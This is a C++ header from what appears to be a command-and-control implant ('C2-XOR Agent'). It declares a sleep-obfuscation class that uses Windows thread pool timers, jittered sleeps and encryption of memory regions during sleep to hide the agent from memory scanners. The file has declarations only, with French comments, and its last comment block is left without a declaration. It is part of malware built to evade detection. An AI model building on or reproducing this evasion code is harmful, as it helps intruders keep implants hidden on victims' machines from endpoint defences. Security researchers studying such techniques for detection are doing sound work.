// b21/sleep_obfuscation.h
// Sleep obfuscation using Thread Pool APIs (Tp*) - B21 technique
// Integrated into C2-XOR Agent

#ifndef SLEEP_OBFUSCATION_H
#define SLEEP_OBFUSCATION_H

#include <windows.h>
#include <vector>

namespace b21 {

/**
 * @brief Structure pour gérer le contexte du timer callback
 */
struct TimerContext {
    HANDLE event;
    volatile BOOL completed;
};

/**
 * @brief Classe principale pour le sleep obfuscation
 */
class SleepObfuscator {
private:
    PTP_POOL threadPool;
    PTP_CLEANUP_GROUP cleanupGroup;
    TP_CALLBACK_ENVIRON callbackEnviron;
    std::vector<BYTE> encryptionKey;
    BOOL initialized;

    VOID GenerateEncryptionKey();
    BOOL EncryptMemoryRegion(PVOID address, SIZE_T size);
    BOOL DecryptMemoryRegion(PVOID address, SIZE_T size);

    static VOID CALLBACK TimerCallback(
        PTP_CALLBACK_INSTANCE instance,
        PVOID context,
        PTP_TIMER timer
    );

public:
    SleepObfuscator();
    ~SleepObfuscator();

    SleepObfuscator(const SleepObfuscator&) = delete;
    SleepObfuscator& operator=(const SleepObfuscator&) = delete;

    /**
     * @brief Initialise le système de sleep obfuscation
     * @return TRUE si succès, FALSE sinon
     */
    BOOL Initialize();

    /**
     * @brief Sleep obfusqué simple
     * @param milliseconds Durée en millisecondes
     * @return TRUE si succès, FALSE sinon
     */
    BOOL Sleep(DWORD milliseconds);

    /**
     * @brief Sleep obfusqué avec jitter aléatoire
     * @param baseMilliseconds Durée de base en ms
     * @param jitterPercent Pourcentage de variation (0.0 - 1.0)
     * @return TRUE si succès, FALSE sinon
     */
    BOOL SleepWithJitter(DWORD baseMilliseconds, FLOAT jitterPercent);

    /**
     * @brief Sleep avec chiffrement de régions mémoire
     * @param milliseconds Durée en ms
     * @param regions Vecteur de paires (adresse, taille) à chiffrer
     * @return TRUE si succès, FALSE sinon
     */
    BOOL SleepWithEncryption(
        DWORD milliseconds,
        const std::vector<std::pair<PVOID, SIZE_T>>& regions
    );

    /**
     * @brief Vérifie si le système est initialisé
     */
    BOOL IsInitialized() const { return initialized; }
};

// ===== Fonctions globales helper =====

/**
 * @brief Obtient l'instance singleton du SleepObfuscator
 */
SleepObfuscator& GetGlobalSleepObfuscator();

/**
 * @brief Sleep obfusqué simple (fonction helper globale)
 * @param milliseconds Durée en millisecondes
 * @return TRUE si succès, FALSE sinon
 */
BOOL obfuscated_sleep(DWORD milliseconds);

/**
 * @brief Sleep obfusqué avec jitter (fonction helper globale)
 * @param baseMilliseconds Durée de base
 * @param jitterPercent Pourcentage de jitter (0.0 - 1.0)
 * @return TRUE si succès, FALSE sinon
 */
BOOL obfuscated_sleep_with_jitter(DWORD baseMilliseconds, FLOAT jitterPercent);

/**
 * @brief Initialise le système de sleep obfuscation global
 * @return TRUE si succès, FALSE sinon
 */
BOOL initialize_sleep_obfuscation();

/**
 * @brief Nettoie les ressources du sleep obfuscation
 */

}

#endif
